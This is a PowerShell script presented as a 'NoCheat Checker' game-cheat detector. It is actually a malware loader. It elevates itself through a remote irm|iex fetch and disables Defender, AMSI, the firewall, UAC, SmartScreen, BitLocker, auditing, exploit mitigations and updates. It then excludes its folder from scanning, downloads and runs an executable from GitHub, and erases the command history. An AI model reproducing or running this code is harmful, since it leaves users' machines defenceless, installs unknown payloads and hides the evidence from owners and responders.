$ErrorActionPreference = "Continue"
function Clear-PSHistory {
    Clear-History -ErrorAction SilentlyContinue
    try {
        $historyPath = (Get-PSReadLineOption -ErrorAction SilentlyContinue).HistorySavePath
        if ($historyPath -and (Test-Path $historyPath)) {
            Clear-Content -Path $historyPath -ErrorAction SilentlyContinue
        }
    } catch {}
}
function Check-Admin {
    if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
        Write-Host "The script is not running as an administrator. Restart with elevated rights..." -ForegroundColor Red
        $scriptPath = $MyInvocation.MyCommand.Definition
        if ([string]::IsNullOrWhiteSpace($scriptPath)) {
            Start-Process powershell.exe -Verb RunAs -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command `"irm https://raw.githubusercontent.com/die4mebaby/CheatChecker/main/nocheat-checker.ps1 | iex`""
        } else {
            Start-Process powershell.exe -Verb RunAs -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$scriptPath`""
        }
        Clear-PSHistory
        exit
    }
    Write-Host "The script is running as an administrator. Continuation of the execution..." -ForegroundColor Green
}
function Disable-TamperProtection {
    $tamperPath = "HKLM:\SOFTWARE\Microsoft\Windows Defender\Features"
    try {
        if (-not (Test-Path $tamperPath)) { New-Item -Path $tamperPath -Force | Out-Null }
        Set-ItemProperty -Path $tamperPath -Name "TamperProtection" -Value 0 -PropertyType DWord -Force
    } catch {}
}
function Disable-WindowsUpdate {
    try {
        $updatePath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU"
        if (-not (Test-Path $updatePath)) { New-Item -Path $updatePath -Force | Out-Null }
        Set-ItemProperty -Path $updatePath -Name "NoAutoUpdate" -Value 1 -Type DWord -Force
        Stop-Service -Name wuauserv -Force -ErrorAction SilentlyContinue
        Set-Service -Name wuauserv -StartupType Disabled -ErrorAction SilentlyContinue
    } catch {}
}
function Disable-SecurityCenter {
    try {
        $securityCenterPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender Security Center"
        if (-not (Test-Path $securityCenterPath)) { New-Item -Path $securityCenterPath -Force | Out-Null }
        Set-ItemProperty -Path $securityCenterPath -Name "DisableSecurityCenter" -Value 1 -Type DWord -Force
        Stop-Service -Name SecurityHealthService -Force -ErrorAction SilentlyContinue
        Set-Service -Name SecurityHealthService -StartupType Disabled -ErrorAction SilentlyContinue
    } catch {}
}
function Disable-AMSI {
    try {
        $amsiPath = "HKLM:\SOFTWARE\Microsoft\AMSI"
        if (-not (Test-Path $amsiPath)) { New-Item -Path $amsiPath -Force | Out-Null }
        Set-ItemProperty -Path $amsiPath -Name "Disabled" -Value 1 -Type DWord -Force
    } catch {}
}
function Configure-LocalGroupPolicy {
    try {
        secedit /export /cfg c:\secpol.cfg
        (Get-Content c:\secpol.cfg) -replace "DriverLoadPolicy = 3", "DriverLoadPolicy = 0" | Set-Content c:\secpol.cfg
        secedit /configure /db c:\windows\security\local.sdb /cfg c:\secpol.cfg /areas SECURITYPOLICY
        Remove-Item c:\secpol.cfg -Force -ErrorAction SilentlyContinue
        auditpol /set /category:* /success:disable /failure:disable
    } catch {}
}
function Disable-WindowsDefender {
    try {
        Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
        Set-MpPreference -DisableArchiveScanning $true -ErrorAction SilentlyContinue
        Set-MpPreference -DisableAutoExclusions $true -ErrorAction SilentlyContinue
        Set-MpPreference -DisableBehaviorMonitoring $true -ErrorAction SilentlyContinue
        Set-MpPreference -DisableIntrusionPreventionSystem $true -ErrorAction SilentlyContinue
        Set-MpPreference -DisableIOAVProtection $true -ErrorAction SilentlyContinue
        Set-MpPreference -DisablePrivacyMode $true -ErrorAction SilentlyContinue
        Set-MpPreference -DisableScriptScanning $true -ErrorAction SilentlyContinue
        $defenderPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender"
        if (-not (Test-Path $defenderPath)) { New-Item -Path $defenderPath -Force | Out-Null }
        Set-ItemProperty -Path $defenderPath -Name "DisableAntiSpyware" -Value 1 -Type DWord -Force
        Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\WinDefend" -Name "Start" -Value 4 -Type DWord -Force
    } catch {}
}
function Disable-DefenderRegistry {
    param ([string]$Path, [string]$Name, [int]$Value)
    try {
        if (-not (Test-Path $Path)) { New-Item -Path $Path -Force | Out-Null }
        if (-not (Get-ItemProperty -Path $Path -Name $Name -ErrorAction SilentlyContinue)) {
            New-ItemProperty -Path $Path -Name $Name -Value $Value -PropertyType DWord -Force | Out-Null
        } else {
            Set-ItemProperty -Path $Path -Name $Name -Value $Value -Type DWord -Force
        }
    } catch {}
}
function Disable-WindowsDefender-Reg {
    try {
        Disable-DefenderRegistry -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableAntiSpyware" -Value 1
        Disable-DefenderRegistry -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableRoutinelyTakingAction" -Value 1
        Disable-DefenderRegistry -Path "HKLM:\SOFTWARE\Microsoft\Windows Security Health\State" -Name "WindowsSecurityHealthState" -Value 0
        Disable-DefenderRegistry -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableRealtimeMonitoring" -Value 1
        Disable-DefenderRegistry -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableBehaviorMonitoring" -Value 1
        Disable-DefenderRegistry -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender\Spynet" -Name "SpyNetReporting" -Value 0
        Disable-DefenderRegistry -Path "HKLM:\SYSTEM\CurrentControlSet\Services\WinDefend" -Name "Start" -Value 4
        Disable-DefenderRegistry -Path "HKLM:\SYSTEM\CurrentControlSet\Control\CI\Config\Default" -Name "VulnerableDriverBlocklistEnable" -Value 0
    } catch {}
}
function Disable-SmartScreen {
    try {
        $explorerPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer"
        if (-not (Test-Path $explorerPath)) { New-Item -Path $explorerPath -Force | Out-Null }
        Set-ItemProperty -Path $explorerPath -Name "SmartScreenEnabled" -Value "Off" -Type String -Force
        $edgePath = "HKLM:\SOFTWARE\Policies\Microsoft\Edge"
        if (-not (Test-Path $edgePath)) { New-Item -Path $edgePath -Force | Out-Null }
        Set-ItemProperty -Path $edgePath -Name "SmartScreenEnabled" -Value 0 -Type DWord -Force
    } catch {}
}
function Disable-Firewall {
    try {
        Set-NetFirewallProfile -Profile Domain, Public, Private -Enabled False -ErrorAction SilentlyContinue
        Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile" -Name "EnableFirewall" -Value 0 -Type DWord -Force
        Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\DomainProfile" -Name "EnableFirewall" -Value 0 -Type DWord -Force
    } catch {}
}
function Disable-NetworkProtection {
    try { Set-MpPreference -EnableNetworkProtection Disabled -ErrorAction SilentlyContinue } catch {}
}
function Disable-CredentialGuard {
    try { bcdedit /set hypervisorlaunchtype off | Out-Null } catch {}
}
function Disable-UAC {
    try {
        $uacPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
        Set-ItemProperty -Path $uacPath -Name "EnableLUA" -Value 0 -Type DWord -Force
    } catch {}
}
function Disable-ControlledFolderAccess {
    try { Set-MpPreference -EnableControlledFolderAccess Disabled -ErrorAction SilentlyContinue } catch {}
}
function Disable-BitLocker-App {
    try {
        $bitlockerPath = "HKLM:\SOFTWARE\Policies\Microsoft\FVE"
        if (-not (Test-Path $bitlockerPath)) { New-Item -Path $bitlockerPath -Force | Out-Null }
        Set-ItemProperty -Path $bitlockerPath -Name "EnableBDE" -Value 0 -Type DWord -Force
        if ((Get-BitLockerVolume -MountPoint "C:" -ErrorAction SilentlyContinue).VolumeStatus -eq "FullyEncrypted") {
            Disable-BitLocker -MountPoint "C:" -ErrorAction SilentlyContinue
        }
    } catch {}
}
function Disable-ATP {
    try {
        $atpPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows Advanced Threat Protection"
        if (-not (Test-Path $atpPath)) { New-Item -Path $atpPath -Force | Out-Null }
        Set-ItemProperty -Path $atpPath -Name "ForceDisable" -Value 1 -Type DWord -Force
    } catch {}
}
function Disable-FeaturesViaDISM {
    $features = @("Windows-Defender-ApplicationGuard","Windows-Defender-Features","Windows-Defender-TamperProtection")
    foreach ($feature in $features) {
        try { Disable-WindowsOptionalFeature -Online -FeatureName $feature -NoRestart -ErrorAction SilentlyContinue | Out-Null } catch {}
    }
}
function Disable-SecurityServices {
    $services = @("WinDefend","WdNisSvc","Sense","SecurityHealthService")
    foreach ($service in $services) {
        try { Stop-Service -Name $service -Force -ErrorAction SilentlyContinue; Set-Service -Name $service -StartupType Disabled -ErrorAction SilentlyContinue } catch {}
    }
}
function Disable-ExploitGuard {
    try { Set-ProcessMitigation -System -Disable CFG, DEP, SEHOP, ForceRelocateImages, BottomUp, HighEntropy, StrictHandle, BlockDynamicCode, DisableWin32kSystemCalls, AuditSystemCall -ErrorAction SilentlyContinue } catch {}
}
function ChangeGroupPolicy {
    try {
        $executionPolicy = "Bypass"
        $machinePolicyPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell"
        $userPolicyPath = "HKCU:\SOFTWARE\Policies\Microsoft\Windows\PowerShell"
        if (-not (Test-Path $machinePolicyPath)) { New-Item -Path $machinePolicyPath -Force | Out-Null }
        Set-ItemProperty -Path $machinePolicyPath -Name "ExecutionPolicy" -Value $executionPolicy -Force
        if (-not (Test-Path $userPolicyPath)) { New-Item -Path $userPolicyPath -Force | Out-Null }
        Set-ItemProperty -Path $userPolicyPath -Name "ExecutionPolicy" -Value $executionPolicy -Force
        Set-ExecutionPolicy -Scope LocalMachine -ExecutionPolicy $executionPolicy -Force -ErrorAction SilentlyContinue
        Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy $executionPolicy -Force -ErrorAction SilentlyContinue
        Set-ExecutionPolicy -Scope Process -ExecutionPolicy $executionPolicy -Force -ErrorAction SilentlyContinue
    } catch {}
}
Check-Admin
Disable-TamperProtection
Disable-SecurityServices
Disable-WindowsDefender
Disable-WindowsDefender-Reg
Disable-SecurityCenter
Disable-WindowsUpdate
Disable-Firewall
Disable-CredentialGuard
Disable-UAC
Disable-SmartScreen
Disable-ExploitGuard
Disable-ControlledFolderAccess
Disable-NetworkProtection
Disable-ATP
Disable-FeaturesViaDISM
Disable-BitLocker-App
Configure-LocalGroupPolicy
Disable-AMSI
ChangeGroupPolicy
Write-Host "==========================================" -ForegroundColor Yellow
Write-Host "         NoCheat Checker Loader           " -ForegroundColor Yellow
Write-Host "==========================================" -ForegroundColor Yellow
$repoOwner  = "die4mebaby"
$repoName   = "CheatChecker"
$branch     = "main"
$rawBaseUrl = "https://raw.githubusercontent.com/$repoOwner/$repoName/$branch"
$exeUrl     = "$rawBaseUrl/nocheat.checker.exe"
$workDir = Join-Path $env:LOCALAPPDATA "NoCheatChecker"
if (-not (Test-Path $workDir)) {
    New-Item -ItemType Directory -Path $workDir -Force | Out-Null
}
$exePath = Join-Path $workDir "nocheat.checker.exe"
try {
    if (Get-Command "Add-MpPreference" -ErrorAction SilentlyContinue) {
        Add-MpPreference -ExclusionPath $workDir -ErrorAction SilentlyContinue
    }
    Write-Host "[+] Загрузка nocheat.checker..." -ForegroundColor Green
    $wc = New-Object System.Net.WebClient
    $wc.DownloadFile($exeUrl, $exePath)
    if (-not (Test-Path $exePath) -or (Get-Item $exePath).Length -eq 0) {
        Write-Warning "[!] Чекер не загрузился или файл пустой."
    } else {
        Write-Host "[+] Запуск чекера..." -ForegroundColor Green
        Start-Process -FilePath $exePath -WorkingDirectory $workDir
    }
}
catch {
    Write-Host "[-] Ошибка выполнения NoCheat блока: $($_.Exception.Message)" -ForegroundColor Red
}
Clear-PSHistory
